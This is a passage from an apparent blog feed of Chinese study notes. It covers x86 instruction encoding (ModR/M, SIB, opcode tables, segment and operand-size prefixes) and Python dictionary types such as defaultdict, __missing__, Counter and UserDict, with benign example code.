12345678] 中， Scale描述2^1， Index描述ECX, Base描述EAX，而12345678 由ModR/M字段决定。<br>所以SIB字段描述的方式为：<br>Base + Index*2^Scale (Scale描述2^Scale，所以只能为 *1 *2 *4 *8)</p><p>分析示例：MOV BYTE PTR DS:[EAX+ECX*2+78563412],AL</p><p>首先可以知道是MOV Eb Gb的形式，</p><p>然后分析这个指令，原型是0x88肯定有MODR/M字段，然后G是AL那么Reg/Opcode为000</p><p>然后观察这个指令形式有多个寄存器，形如下方的[–][–]+disp32，所以能确定MODR/M字段</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324224736647.png" alt="image-20220324224736647" style="zoom:67%;"><p>然后根据EAX+ECX*2+78563412，其中<strong>Base对应EAX</strong>，**Index对应ECX,***<strong>2^1说明Scale为1</strong>，可以得出SIB值为</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324225148648.png" alt="image-20220324225148648" style="zoom:67%;"><p>SIB字段的图表如下<br>1、当Index = 100 时，Index被0替代，此时只有Base有效</p><pre><code>2、当Base = 101 时，Base被0替代，此时只用Index有效，最上面那行</code></pre><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324225238995.png" alt="image-20220324225238995" style="zoom:80%;"><p>由此可推出，ModR/M整个字段，最长是6个字节</p><p>88 84 48</p><p>89 84 84</p><p>89 84 22</p><p>89 AC 15</p><p><strong>当Base为101时，解释如下，需要看MOD字段</strong></p><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220324234036589.png" alt="image-20220324234036589"></p><p><strong>89 2C 15</strong></p><p>MOD Ev Gv</p><p>00 101 100</p><p>Reg = 101 = EBP (v假设是32位 )</p><p>MOD R/M = 00 100 =[…][…]</p><p>SIB = 00 010 101</p><p>base = 101 看MOD为00  ,所以是index*2^1 + disp32</p><p>index =010 = EDX</p><p>v = 假设是32位运行 = DWORD</p><p>MOV DWORD PTR [EDX+disp32] EBP</p><h1 id="3查表"><a class="markdownIt-Anchor" href="#3查表"></a> 3.查表</h1><p>主表是TABLE A-2，在英特尔白皮书里</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326190802686.png" alt="image-20220326190802686" style="zoom:50%;"><p>例如 50 系列，先看这个表的对应位置，这里显示的是PUSH，但是后面还有个d64</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326191018703.png" alt="image-20220326191018703" style="zoom:67%;"><p>这个d64查另一个表</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326191113328.png" alt="image-20220326191113328" style="zoom:50%;"><p>这里<strong>i64说明这个指令在64位无效，o64只在64位有效，d64表示在64位下运行时默认按64位执行</strong>，</p><p>rAX这类字符的原文说明：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">A.<span class="hljs-number">2.3</span> <span class="hljs-keyword">Register</span> Codes<br><span class="hljs-keyword">When</span> an opcode requires a specific <span class="hljs-keyword">register</span> as an operand, the <span class="hljs-keyword">register</span> <span class="hljs-keyword">is</span> identified <br>by name (<span class="hljs-keyword">for</span> example, AX, CL, <span class="hljs-keyword">or</span> ESI). The name indicates whether the <span class="hljs-keyword">register</span> <span class="hljs-keyword">is</span> <br><span class="hljs-number">64</span>, <span class="hljs-number">32</span>, <span class="hljs-number">16</span>, <span class="hljs-keyword">or</span> <span class="hljs-number">8</span> bits wide.<br>A <span class="hljs-keyword">register</span> identifier <span class="hljs-keyword">of</span> the form eXX <span class="hljs-keyword">or</span> rXX <span class="hljs-keyword">is</span> used <span class="hljs-keyword">when</span> <span class="hljs-keyword">register</span> <span class="hljs-literal">width</span> depends <span class="hljs-keyword">on</span> <br>the operand-size <span class="hljs-keyword">attribute</span>. eXX <span class="hljs-keyword">is</span> used <span class="hljs-keyword">when</span> <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> sizes are possible; rXX <span class="hljs-keyword">is</span> <br>used <span class="hljs-keyword">when</span> <span class="hljs-number">16</span>, <span class="hljs-number">32</span>, <span class="hljs-keyword">or</span> <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> sizes are possible. <span class="hljs-keyword">For</span> example: eAX indicates that the <br>AX <span class="hljs-keyword">register</span> <span class="hljs-keyword">is</span> used <span class="hljs-keyword">when</span> the operand-size <span class="hljs-keyword">attribute</span> <span class="hljs-keyword">is</span> <span class="hljs-number">16</span> <span class="hljs-keyword">and</span> the EAX <span class="hljs-keyword">register</span> <span class="hljs-keyword">is</span> used <br><span class="hljs-keyword">when</span> the operand-size <span class="hljs-keyword">attribute</span> <span class="hljs-keyword">is</span> <span class="hljs-number">32</span>. rAX can indicate AX, EAX <span class="hljs-keyword">or</span> RAX.<br><span class="hljs-keyword">When</span> the REX.B <span class="hljs-built_in">bit</span> <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> modify the <span class="hljs-keyword">register</span> specified <span class="hljs-keyword">in</span> the reg field <span class="hljs-keyword">of</span> the <br>opcode, this fact <span class="hljs-keyword">is</span> indicated by adding “/x” <span class="hljs-keyword">to</span> the <span class="hljs-keyword">register</span> name <span class="hljs-keyword">to</span> indicate the additional possibility. <span class="hljs-keyword">For</span> example, rCX/r9 <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> indicate that the <span class="hljs-keyword">register</span> could either <br>be rCX <span class="hljs-keyword">or</span> r9. <span class="hljs-literal">Note</span> that the size <span class="hljs-keyword">of</span> r9 <span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span> <span class="hljs-keyword">is</span> determined by the operand size <br><span class="hljs-keyword">attribute</span> (just as <span class="hljs-keyword">for</span> rCX)<br>机翻<br>当一个操作码需要一个特定的寄存器作为操作数时，该寄存器由名称（例如，AX、CL或ESI）标识。该名称指示寄存器是<span class="hljs-number">64</span>、<span class="hljs-number">32</span>、<span class="hljs-number">16</span>还是<span class="hljs-number">8</span>位宽。<br>当寄存器宽度取决于操作数大小属性时，使用eXX或rXX形式的寄存器标识符。当<span class="hljs-number">16</span>位或<span class="hljs-number">32</span>位大小是可能的时，使用eXX；<br>当<span class="hljs-number">16</span>位、<span class="hljs-number">32</span>位或<span class="hljs-number">64</span>位大小是可能的时，使用rXX。例如：eAX表示当操作数大小属性为<span class="hljs-number">16</span>时使用AX寄存器，当操作数大小属性为<span class="hljs-number">32</span>时使用eAX寄存器。rAX可以表示AX、EAX或rAX。<br>当REX.B位用于修改操作码的reg字段中指定的寄存器，这一事实通过在寄存器名称中添加“/x”来表示，以表示额外的可能性。例如，rCX/r9用于指示寄存器可以是rCX或r9。请注意，在这种情况下，r9的大小由操作数大小属性决定（与rCX一样）<br></code></pre></td></tr></table></figure><p>总之就是rAX是指多少位代表多少，16位是AX,32位是EAX,64是RAX</p><p>eAX只能是AX和EAX</p><h2 id="如果是多位的opcode"><a class="markdownIt-Anchor" href="#如果是多位的opcode"></a> <strong>如果是多位的opcode</strong></h2><p>例如之前学过的JCC指令，0x0f 0x8x，现在看0f处</p><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326193318842.png" alt="image-20220326193318842"></p><p>这就需要查A-3，<strong>（这里除了0F处，其他指令都是1字节）</strong></p><p>然后查A-3</p><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326193713065.png" alt="image-20220326193713065"></p><p>这里<strong>第二位opcode是 38 ，3A的地方，要查A-4，A-5的表，说明opcode长度是3</strong></p><p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326193957195.png" alt="image-20220326193957195"></p><p>如果A2里有Grp，查A6</p><img src="/2022/03/26/%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AD%A6%E4%B9%A0/image-20220326194143351.png" alt="image-20220326194143351" style="zoom:80%;"><h2 id="段前缀"><a class="markdownIt-Anchor" href="#段前缀"></a> 段前缀</h2><p>​<br>段寄存器的作用：早期8086cpu寻址范围小，Inter遍通过段寄存器来拓展内存.即通过段寄存器基址+偏移的方式来寻址。<br>[]中的地址为有效地址(Effect Address)，有效地址+段寄存器基址才是实际地址LA(线性地址 Line Address)。<br>线性地址 = 段基址 + 有效地址<br>在后来的80386时，cpu的寻址范围大大提升，这些段寄存器便被用作了其他用途。但是DS:[]类似<br>这种寻址格式却被保留了下来。<br>实际上操作码已经决定了寻址时使用哪个段寄存器作为基址，不需要其他字节描述。<br>1、如果没有特别说明，[]前为DS，即DS:[]<br>2、<strong>PUSH POP指令，以及在[]中使用ESP/EBP的，使用SS段</strong><br>3、在[Base + Index*2Scale + I]中,以Base为判断条件，没有特别说明，用DS。如果Base为ESP/EBP，则用SS段.<br>4、串操作指令一般使用ES。<strong>MOV ES:[EDI] DS:[ESI]中，目标EDI使用ES段，其他使用DS段.</strong><br>5、EIP指向当前指令，<strong>EIP取指令时使用的是CS段.</strong><br>6、如果指令加段寄存器前缀，则该条指令一律用这个段，如果加多个段寄存器前缀，默认只看op前的那个.</p><h2 id="操作指令前缀关于之前指令为啥没有16位寄存器"><a class="markdownIt-Anchor" href="#操作指令前缀关于之前指令为啥没有16位寄存器"></a> 操作指令前缀关于之前指令为啥没有16位寄存器</h2><p>0x66 将操作数改为16字节。例子50为 PUSH EAX, 而66 50则为 PUSH AX</p><p>004183DA      50                     PUSH EAX<br>004183DB      66:50                  PUSH AX</p><h2 id="操作指令前缀修改默认寻址方式"><a class="markdownIt-Anchor" href="#操作指令前缀修改默认寻址方式"></a> 操作指令前缀：修改默认寻址方式</h2><p>0x67 将操作数改为16字节。例子50为 PUSH EAX, 而66 50则为 PUSH AX</p><p>004183FD      8801          MOV BYTE PTR DS:[ECX],AL<br>004183FF      67:8801       MOV BYTE PTR DS:[BX+DI],AL</p>]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习-3</title>
    <link href="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/"/>
    <url>/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/</url>
    
    <content type="html"><![CDATA[<h1 id="第-3-章-字典和集合"><a class="markdownIt-Anchor" href="#第-3-章-字典和集合"></a> 第 3 章 字典和集合</h1><h2 id="31-泛映射类型"><a class="markdownIt-Anchor" href="#31-泛映射类型"></a> 3.1 泛映射类型</h2><p>如果一个对象是可散列的，那么在这个对象的生命周期中，它 的散列值是不变的，而且这个对象需要实现 __hash__() 方 法。另外可散列对象还要有 __qe__() 方法，这样才能跟其他 键做比较。如果两个可散列对象是相等的，那么它们的散列值 一定是一样的……</p><p>字典的构造方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">dict</span>(a=<span class="hljs-number">1</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>)<br>b = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-number">3</span>&#125;<br>c = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>([<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]))<br>d = <span class="hljs-built_in">dict</span>([(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">3</span>)])<br>e = <span class="hljs-built_in">dict</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;)<br><span class="hljs-built_in">print</span> (a==b==c==d==e) <span class="hljs-comment">#True</span><br><br></code></pre></td></tr></table></figure><h2 id="32-字典推导"><a class="markdownIt-Anchor" href="#32-字典推导"></a> 3.2 字典推导</h2><p>可以像{k.upper():v for k,v in dict_t.items() if v&lt;2}这样生成字典并且过滤需要的条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">testdict = [(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">3</span>)]<br>dict_t = &#123;k:v <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> testdict&#125;<br><span class="hljs-built_in">print</span> (dict_t) <span class="hljs-comment">#&#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span><br><br><span class="hljs-built_in">print</span>(&#123;k.upper():v <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> dict_t.items() <span class="hljs-keyword">if</span> v&lt;<span class="hljs-number">2</span>&#125;) <span class="hljs-comment">#&#123;&#x27;A&#x27;: 1&#125;</span><br></code></pre></td></tr></table></figure><h2 id="33-常见的映射方法"><a class="markdownIt-Anchor" href="#33-常见的映射方法"></a> 3.3 常见的映射方法</h2><p><img src="/2022/03/22/python%E5%AD%A6%E4%B9%A0-3/image-20220321193330771.png" alt="image-20220321193330771"></p><h3 id="用setdefault处理找不到的键"><a class="markdownIt-Anchor" href="#用setdefault处理找不到的键"></a> 用setdefault处理找不到的键</h3><p>如果字典找不到正确的键，则会抛出异常，这时候就需要一个找不到键的时候的默认返回值，第一种写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> my_dict:<br>    my_dict[key] = []<br>my_dict[key].append(new_value)<br><br></code></pre></td></tr></table></figure><p>第二种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict.setdefault(key, []).append(new_value)<br></code></pre></td></tr></table></figure><p>这2种写法虽然效果一样，但是第一种实际上查询了2次，如果键不存在的话还得再次查询，第二种就可一次完成操作</p><h2 id="34-映射的弹性键查询"><a class="markdownIt-Anchor" href="#34-映射的弹性键查询"></a> 3.4 映射的弹性键查询</h2><h3 id="341-defaultdict处理找不到的键的一个选择"><a class="markdownIt-Anchor" href="#341-defaultdict处理找不到的键的一个选择"></a> 3.4.1 defaultdict：处理找不到的键的一个选择</h3><p>我们新建了这样一个字典：dd = defaultdict(list)，如果键 ‘new-key’ 在 dd 中还不存在的话，表达式 dd[‘new-key’] 会按照以 下的步骤来行事。</p><p>(1) 调用 list() 来建立一个新列表。</p><p>(2) 把这个新列表作为值，‘new-key’ 作为它的键，放到 dd 中。</p><p>(3) 返回这个列表的引用。</p><p>而这个用来生成默认值的可调用对象存放在名为 default_factory 的 实例属性里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> collections<br><br>dict1 = collections.defaultdict(<span class="hljs-built_in">list</span>) <br><span class="hljs-built_in">print</span> (dict1)<br>dict1[<span class="hljs-string">&#x27;c&#x27;</span>].append(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span> (dict1)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">defaultdict(&lt;class &#x27;list&#x27;&gt;, &#123;&#125;)</span><br><span class="hljs-string">defaultdict(&lt;class &#x27;list&#x27;&gt;, &#123;&#x27;c&#x27;: [1]&#125;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>如果在创建 defaultdict 的时候没有指定 default_factory，查询不 存在的键会触发 KeyError。</p><h3 id="342-特殊方法__missing__"><a class="markdownIt-Anchor" href="#342-特殊方法__missing__"></a> 3.4.2 特殊方法__missing__</h3><p>所有的映射类型在处理找不到的键的时候，都会牵扯到 <strong>__missing__</strong> 方法。这也是这个方法称作“missing”的原因。虽然基类 dict 并没有定 义这个方法，但是 dict 是知道有这么个东西存在的。也就是说，如果 有一个类继承了 dict，然后这个继承类提供了 <strong>missing</strong> 方法，那 么<strong>在 __getitem__ 碰到找不到的键的时候，Python 就会自动调用它，</strong> 而不是抛出一个 KeyError 异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">strkeydict0</span>(<span class="hljs-params"><span class="hljs-built_in">dict</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__missing__</span>(<span class="hljs-params">self,key</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key,<span class="hljs-built_in">str</span>):  <span class="hljs-comment">#isinstance() 函数来判断一个对象是否是一个已知的类型，类似 type()。例子isinstance (a,int)</span><br>            <span class="hljs-keyword">raise</span> KeyError(key) <span class="hljs-comment">#上面判断是否是字符串，否则抛出KeyError异常</span><br>        <span class="hljs-keyword">return</span> self[<span class="hljs-built_in">str</span>(key)] <span class="hljs-comment">#如果找不到的键不是字符串，那么把它转换成字符串再进行查找。</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self,key,default=<span class="hljs-literal">None</span></span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> self[key] <span class="hljs-comment"># get 方法把查找工作用 self[key] 的形式委托给 __getitem__，这样在宣布查找失败之前，还能通过 __missing__ 再给某个键一个机会。</span><br><br>        <span class="hljs-keyword">except</span> KeyError:<br>            <span class="hljs-keyword">return</span> default <span class="hljs-comment"># 如果抛出 KeyError，那么说明 __missing__ 也失败了，于是返回default。</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__contains__</span>(<span class="hljs-params">self, key</span>):</span><br>        <span class="hljs-keyword">return</span> key <span class="hljs-keyword">in</span> self.keys() <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(key) <span class="hljs-keyword">in</span> self.keys() <span class="hljs-comment"># 先按照传入键的原本的值来查找（我们的映射类型中可能含有非字符串的键），如果没找到，再用 str() 方法把键转换成字符串再查找一次。</span><br><br><br>d = strkeydict0(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">1</span>&#125;) <br><span class="hljs-built_in">print</span>(d.get(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-built_in">print</span>(d.get(<span class="hljs-string">&#x27;c&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输出</span><br><span class="hljs-string">1</span><br><span class="hljs-string">None</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(d.get(<span class="hljs-string">&#x27;r&#x27;</span>)) <span class="hljs-comment">#这里可以看到调用了missing方法</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;c:ython\第三章.py&quot;</span>, line <span class="hljs-number">45</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;r&#x27;</span>])<br>  File <span class="hljs-string">&quot;c:ython\第三章.py&quot;</span>, line <span class="hljs-number">28</span>, <span class="hljs-keyword">in</span> __missing__<br>    <span class="hljs-keyword">raise</span> KeyError(key) <span class="hljs-comment">#上面判断是否是字符串，否则抛出KeyError异常</span><br>KeyError: <span class="hljs-string">&#x27;r&#x27;</span><br></code></pre></td></tr></table></figure><p>i<strong>sinstance(key, str) 测试在上面的 <em>_missing</em>_ 中是必需的。</strong></p><p>如果没有这个测试，只要 str(k) 返回的是一个存在的键，那么 <em>_missing</em>_ 方法是没问题的，不管是字符串键还是非字符串键，它都能正常运行。但是如果 str(k) 不是一个存在的键，代码就会陷入无限递归。这是因为 <em>_missing</em>_ 的最后一行中的 <strong>self[str(key)] 会 调用 __getitem__</strong>，而这个 str(key) 又不存在，于是 <em>_missing</em>_ 又会被调用。 为了保持一致性，__contains__ 方法在这里也是必需的。这是因为 <strong>k in d</strong> 这个操作会调用它，但是我们从 <strong>dict 继承到的 __contains__ 方法不会在找不到键的时候调用 __missing__ 方法</strong>。<code>__contains__</code> 里还有个细节，就是我们这里没有用更具 Python 风格的方式——k in my_dict——来检查键是否存在，因为那也会导致 <code>__contains__</code> 被递 归调用。为了避免这一情况，这里采取了更显式的方法，直接在这个 self.keys() 里查询。</p><h2 id="35-字典的变种"><a class="markdownIt-Anchor" href="#35-字典的变种"></a> 3.5 字典的变种</h2><p>这一节总结了标准库里 collections 模块中，除了 defaultdict 之外 的不同映射类型。</p><p><strong>collections.OrderedDict</strong></p><p>这个类型在添加键的时候会保持顺序，因此键的迭代次序总是一致 的。OrderedDict 的 popitem 方法默认删除并返回的是字典里的最后 一个元素，但是如果像 my_odict.popitem(last=False) 这样调用 它，那么它删除并返回第一个被添加进去的元素。</p><p><strong>collections.ChainMap</strong></p><p>该类型可以容纳数个不同的映射对象，然后在进行键查找操作的时 候，这些对象会被当作一个整体被逐个查找，直到键被找到为止。这个 功能在给有嵌套作用域的语言做解释器的时候很有用，可以用一个映射 对象来代表一个作用域的上下文。在 collections 文档介绍 ChainMap 对象的那一部分</p><p><strong>collections.Counter</strong></p><p>这个映射类型会给键准备一个整数计数器。每次更新一个键的时候 都会增加这个计数器。所以这个类型可以用来给可散列表对象计数，或 者是当成多重集来用——多重集合就是集合里的元素可以出现不止一 次。Counter 实现了 + 和 - 运算符用来合并记录，还有像 most_common([n]) 这类很有用的方法。most_common([n]) 会按照次 序返回映射里最常见的 n 个键和它们的计数，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">ct = collections.Counter(<span class="hljs-string">&#x27;aaabbbcccc&#x27;</span>)<br><span class="hljs-built_in">print</span> (ct) <span class="hljs-comment">#Counter(&#123;&#x27;c&#x27;: 4, &#x27;a&#x27;: 3, &#x27;b&#x27;: 3&#125;)</span><br>ct.update(<span class="hljs-string">&#x27;aaccb&#x27;</span>)<br><span class="hljs-built_in">print</span> (ct) <span class="hljs-comment">#Counter(&#123;&#x27;c&#x27;: 6, &#x27;a&#x27;: 5, &#x27;b&#x27;: 4&#125;)</span><br></code></pre></td></tr></table></figure><p><strong>colllections.UserDict</strong></p><p>这个类其实就是把标准 dict 用纯 Python 又实现了一遍。 跟 OrderedDict、ChainMap 和 Counter 这些开箱即用的类型不 同，UserDict 是让用户继承写子类的。</p><h2 id="36-子类化userdict"><a class="markdownIt-Anchor" href="#36-子类化userdict"></a> <strong>3.6 子类化UserDict</strong></h2><p>就创造自定义映射类型来说，以 UserDict 为基类，总比以普通的 dict 为基类要来得方便。 这体现在，我们能够改进示例 3-7 中定义的 StrKeyDict0 类，使得所有的键都存储为字符串类型。 而更倾向于从 UserDict 而不是从 dict 继承的主要原因是，后者有时 会在某些方法的实现上走一些捷径，导致我们不得不在它的子类中重写这些方法，但是 UserDict 就不会带来这些问题。</p><p>UserDict 并不是 dict 的子类，但是 UserDict 有一个叫作 data 的属性，是 dict 的实例，这个属性实际上 是 UserDict 最终存储数据的地方。这样做的好处是，比起上例 ，UserDict 的子类就能在实现 <em>_setitem</em>_ 的时候避免不必要的递归，也可以让 <em>_contains</em>_ 里的代码更简洁。 多亏了 UserDict，示例 3-8 里的 StrKeyDict 的代码比示例 3-7 里的 StrKeyDict0 要短一些，功能却更完善：它不但把所有的键都以字符串的形式存储，还能处理一些创建或者更新实例时包含非字符串类型的键这类意外情况。</p><p><strong>self.data会把所有的key转换为字符串，所以这里<code>__contains__</code>方法里写return str(key) in self.data即可</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">strkeydict</span>(<span class="hljs-params">collections.UserDict</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__missing__</span>(<span class="hljs-params">self,key</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key,<span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">raise</span> KeyError(key)<br>        <span class="hljs-keyword">return</span> self[<span class="hljs-built_in">str</span>(key)]<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">     __contains__ 则更简洁些。这里可以放心假设所有已经存储的键都</span><br><span class="hljs-string">是字符串。因此，只要在 self.data 上查询就好了，并不需要像</span><br><span class="hljs-string">StrKeyDict0 那样去麻烦 self.keys()。</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__contains__</span>(<span class="hljs-params">self, key</span>):</span>  <span class="hljs-comment">#</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(key) <span class="hljs-keyword">in</span> self.data<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    __setitem__ 会把所有的键都转换成字符串。由于把具体的实现委</span><br><span class="hljs-string">托给了 self.data 属性，</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__setitem__</span>(<span class="hljs-params">self, key, item</span>):</span><br>        self.data[<span class="hljs-built_in">str</span>(key)] = item<br><br>testd = strkeydict(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-number">3</span>&#125;)<br><span class="hljs-built_in">print</span>(testd.get(<span class="hljs-string">&#x27;c&#x27;</span>))<br><span class="hljs-built_in">print</span>(testd.get(<span class="hljs-string">&#x27;e&#x27;</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">3</span><br><span class="hljs-string">None</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>MutableMapping.update</p><p>这个方法不但可以为我们所直接利用，它还用在 <code>__init__</code> 里，让 构造方法可以利用传入的各种参数（其他映射类型、元素是 (key, value) 对的可迭代对象和键值参数）来新建实例。因为这个方法在背 后是用 self[key] = value 来添加新值的，所以它其实是在使用我们 的 <code>__setitem__</code> 